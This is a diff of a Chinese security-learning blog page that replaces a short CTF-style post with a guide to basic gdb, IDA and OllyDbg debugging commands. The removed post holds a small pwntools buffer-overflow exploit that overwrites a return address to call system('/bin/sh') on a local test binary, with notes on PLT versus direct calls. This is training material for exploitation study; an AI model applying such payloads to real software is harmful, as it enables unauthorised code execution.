@@ -19,24 +19,24 @@
   <meta name="author" content="luyanpei">
   <meta name="keywords" content="">
   
-    <meta name="description" content="12345678910111213141516from pwn import *context.log_level&#x3D;&#x27;debug&#x27;p&#x3D;process(&#x27;.&#x2F;test2&#x27;)system_addr&#x3D;0x0804845Cbin_sh_addr&#x3D;0x0804A024system_plt_addr&#x3D;0x08048320payload&#x3D;(0x88+0x4)*b&amp;#x27">
+    <meta name="description" content="调试基础基本命令包括以下几个：-    1.输入gdb或者gdb-multiarch program进行本地调试 -    2.如果是本地程序的话，可以输入entry或者start进入第一条指令   -  entry  -     如果是本地调试有main函数，则可以输入main直接进入main函数    -       main  -    3.如果调试的程序有源代码，则输入n执行的时候是按照源">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于布置栈的见解">
-<meta property="og:url" content="http://example.com/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/index.html">
+<meta property="og:title" content="基本调试方法">
+<meta property="og:url" content="http://example.com/2024/10/15/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="Hello~ lpp">
-<meta property="og:description" content="12345678910111213141516from pwn import *context.log_level&#x3D;&#x27;debug&#x27;p&#x3D;process(&#x27;.&#x2F;test2&#x27;)system_addr&#x3D;0x0804845Cbin_sh_addr&#x3D;0x0804A024system_plt_addr&#x3D;0x08048320payload&#x3D;(0x88+0x4)*b&amp;#x27">
+<meta property="og:description" content="调试基础基本命令包括以下几个：-    1.输入gdb或者gdb-multiarch program进行本地调试 -    2.如果是本地程序的话，可以输入entry或者start进入第一条指令   -  entry  -     如果是本地调试有main函数，则可以输入main直接进入main函数    -       main  -    3.如果调试的程序有源代码，则输入n执行的时候是按照源">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-10-15T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-10-16T12:40:27.028Z">
+<meta property="article:modified_time" content="2024-10-16T12:41:58.735Z">
 <meta property="article:author" content="luyanpei">
-<meta property="article:tag" content="stack">
+<meta property="article:tag" content="other">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>关于布置栈的见解 - Hello~ lpp</title>
+  <title>基本调试方法 - Hello~ lpp</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="关于布置栈的见解"></span>
+            <span id="subtitle" data-typed-text="基本调试方法"></span>
           
         </div>
 
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          246 字
+          837 字
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          3 分钟
+          7 分钟
         
       </span>
     
@@ -293,7 +293,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">关于布置栈的见解</h1>
+            <h1 id="seo-header">基本调试方法</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -306,12 +306,144 @@
             
               <div class="markdown-body">
                 
-                <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./test2&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x0804845C</span><br>bin_sh_addr=<span class="hljs-number">0x0804A024</span><br>system_plt_addr=<span class="hljs-number">0x08048320</span><br>payload=(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+p32(system_addr)+p32(bin_sh_addr)<br><span class="hljs-comment">#payload1=(0x88+0x4)*&#x27;a&#x27;+p32(system_plt_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br><span class="hljs-comment">#error_payload=(0x88+0x4)*&#x27;a&#x27;+p32(system_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br>gdb.attach(p)<br><span class="hljs-comment">#print payload</span><br><span class="hljs-comment">#print payload1</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+                <h2 id="调试基础"><a href="#调试基础" class="headerlink" title="调试基础"></a>调试基础</h2><h4 id="基本命令包括以下几个："><a href="#基本命令包括以下几个：" class="headerlink" title="基本命令包括以下几个："></a>基本命令包括以下几个：</h4><p>- </p>
+<p>  1.输入gdb或者gdb-multiarch program进行本地调试</p>
+<p>- </p>
+<p>  2.如果是本地程序的话，可以输入entry或者start进入第一条指令</p>
+<p>  - </p>
+<pre><code class="hljs">entry
 
-<p>调用函数plt地址，需要有返回地址一般加“bbbb”这类无效地址，后面加参数。</p>
-<p>调用程序代码段的函数直接跟参数就行。</p>
-<p>汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。</p>
-<p>总而言之如果调用的是代码段里的函数后面直接跟该函数参数就可以，如果是调用的plt段的函数需要提供一个虚假返回地址后面再跟该函数的参数，上文的error_payload是将两者杂糅了，调用了代码段的函数并且提供了虚假的返回地址，导致system函数的参数是’bbbb’，而不是binsh_addr.</p>
+- 
+
+  如果是本地调试有main函数，则可以输入main直接进入main函数
+
+  - 
+
+    main
+</code></pre>
+<p>- </p>
+<p>  3.如果调试的程序有源代码，则输入n执行的时候是按照源代码一行一行执行的；</p>
+<p>  - </p>
+<pre><code class="hljs">如果没有源代码，则输入ni来按照汇编语言执行一条条指令
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">如果指令是调用了函数，则可以通过si进入调用内部
+</code></pre>
+<p>- </p>
+<p>  4.输入p 函数名可以打印出函数地址，然后使用nearpc 地址即可显示此函数的反汇编代码</p>
+<p>  - </p>
+<pre><code class="hljs">p scanf
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">nearpc 0x7ffff7a777f0
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">p/x：以16进制显示变量值
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">p/d：10进制显示
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">p/o：8进制显示
+</code></pre>
+<p>- </p>
+<p>  5.下断点，如果有符号，可以直接使用b 函数名下断点，如果没有，则需要使用b *address的方式下断点</p>
+<p>  - </p>
+<pre><code class="hljs">b read/b recv
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">b *0x40062b
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">通过
+
+- 
+
+  bl列出所有断点 
+
+- 
+
+  bc清除断点 
+
+- 
+
+  bd临时禁用断点 
+
+- 
+
+  be启用断点
+</code></pre>
+<p>- </p>
+<p>  6.下完断点之后需要执行到断点，从头开始运行输入r命令，继续运行输入c</p>
+<p>- </p>
+<p>  7.通过stack命令可以查看栈的数据</p>
+<p>  - </p>
+<pre><code class="hljs">stack 0x20 [0x20为查看的长度]
+</code></pre>
+<p>- </p>
+<p>  8.输入context可以重新刷新一下之前的调试界面</p>
+<p>- </p>
+<p>  9.可以通过hexdump查看栈的地址的内容</p>
+<p>  - </p>
+<pre><code class="hljs">hexdump 0x7fffffffe3b8
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">x/s 0x7fffffffe3b8
+</code></pre>
+<p>- </p>
+<p>  10.通过nextcall可以直接进行下一次调用</p>
+<p>- </p>
+<p>  11.vmmap可以查看内存布局</p>
+<p>- </p>
+<p>  12.可以使用p $eax查看寄存器的值，也可以使用i r eax查看</p>
+<p>- </p>
+<p>  13.如果使用的调试器为peda：</p>
+<p>  - </p>
+<pre><code class="hljs">pattern create 200
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">pattern offset 0xaddr
+</code></pre>
+<p>- </p>
+<p>  14.如果遇到栈溢出需要查看偏移量：</p>
+<p>  - </p>
+<pre><code class="hljs">cyclic 200生成200字节的长度数据
+</code></pre>
+<p>  - </p>
+<pre><code class="hljs">cyclic -l 覆盖的前四个字母：cyclic -l jaab,输出即为偏移量
+</code></pre>
+<h3 id="IDA和OD快捷键"><a href="#IDA和OD快捷键" class="headerlink" title="IDA和OD快捷键"></a>IDA和OD快捷键</h3><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>- </p>
+<p>  y修改变量为类型加值</p>
+<p>- </p>
+<p>  n单纯修改变量</p>
+<p>- </p>
+<p>  G跳转到指定地址</p>
+<p>- </p>
+<p>  X查看交叉引用</p>
+<p>- </p>
+<p>  shift+F12查找字符串</p>
+<p>- </p>
+<p>  数组和</p>
+<p>- </p>
+<p>  空格切换图形和文本视图</p>
+<p>- </p>
+<p>  shift+e查看data段初始化的全局变量及静态变量</p>
+<h4 id="OD"><a href="#OD" class="headerlink" title="OD"></a>OD</h4><p>- </p>
+<p>  F2下断点</p>
+<p>- </p>
+<p>  F4运行到选中指令</p>
+<p>- </p>
+<p>  F8步过</p>
+<p>- </p>
+<p>  F7单步执行</p>
+<p>- </p>
+<p>  数据窗口跟随</p>
+<p>- </p>
+<p>  智能搜索可以查找的字符串更全</p>
+<p>- </p>
+<p>  od的基址与ida可能不一样</p>
+<p>- </p>
+<p>   在看<a target="_blank" rel="noopener" href="http://www.52pojie.cn/thread-200439-1-1.html">Shark恒 破解教程</a> 时，有很多吾友对教程中按键的含义不懂，我发一个常用的快捷键列表，希望对新手有点帮助。 打开一个新的可执行程序 (F3) 重新运行当前调试的程序 (Ctrl+F2) 当前调试的程序 (Alt+F2) 运行选定的程序进行调试 (F9) 暂时停止被调试程序的执行 (F12) 单步进入被调试程序的 Call 中 (F7) 步过被调试程序的 Call (F8) 跟入被调试程序的 Call 中 (Ctrl+F11) 跟踪时跳过被调试程序的 Call (Ctrl+F12) 执行直到返回 (Ctrl+F9) 显示记录窗口 (Alt+L) 显示模块窗口 (Alt+E) 显示内存窗口 (Alt+M) 显示 CPU 窗口 (Alt+C) 显示补丁窗口 (Ctrl+P) 显示呼叫堆栈 (Alt+K) 显示断点窗口 (Alt+B) 打开调试选项窗口 (Alt+O)</p>
 
                 
               </div>
@@ -345,7 +477,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/stack/" class="print-no-link">#stack</a>
+        <a href="/tags/other/" class="print-no-link">#other</a>
       
     </div>
   
@@ -357,8 +489,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>关于布置栈的见解</div>
-      <div>http://example.com/2024/10/15/关于布置栈的见解/</div>
+      <div>基本调试方法</div>
+      <div>http://example.com/2024/10/15/调试基础/</div>
     </div>
     <div class="license-meta">
       
@@ -402,9 +534,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/15/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/" title="mprotect函数可以修改内存栈的权限">
+                      <a href="/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/" title="关于布置栈的见解">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">mprotect函数可以修改内存栈的权限</span>
+                        <span class="hidden-mobile">关于布置栈的见解</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -412,8 +544,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/15/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/" title="基本调试方法">
-                        <span class="hidden-mobile">基本调试方法</span>
+                      <a href="/2024/09/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%88fork%EF%BC%89/" title="">
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
